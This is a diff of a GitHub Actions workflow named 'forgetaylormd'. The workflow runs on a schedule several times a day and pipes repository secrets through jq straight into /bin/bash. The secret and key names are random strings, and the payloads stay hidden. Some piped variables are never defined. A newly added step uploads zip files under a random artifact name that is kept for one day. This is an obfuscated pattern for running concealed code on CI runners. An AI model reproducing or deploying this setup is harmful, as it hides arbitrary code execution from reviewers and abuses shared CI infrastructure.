@@ -1,9 +1,9 @@
 name: forgetaylormd
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '20 5/6 * * *'
 
+  schedule:
+    - cron: '51 3,9,15,21 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,13 +11,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: forgetaylormd
         env:
-          k814: ${{ secrets.k814 }}
+          jglsq339: ${{ secrets.jglsq339 }}
         run: |
-          echo $k814 | jq -r .kkt58386 | /bin/bash
-          echo $duute28642 | jq -r .domp9944 | /bin/bash
-          echo $cnj02149 | jq -r .sd67 | /bin/bash
-          echo $uo26954 | jq -r .dtfl7176 | /bin/bash
-          echo $xzekt21 | jq -r .h3286 | /bin/bash
-          echo $emiqy02466 | jq -r .upnoc445 | /bin/bash
-          echo $cxn610 | jq -r .vdoaa257 | /bin/bash
+          printf '%s' "$jglsq339" | jq -r .cvxqt294 | /bin/bash
+          printf '%s' "$c47635" | jq -r .hdkg8896 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: VtOzqYCI
+          path: "*.zip"
+          retention-days: 1
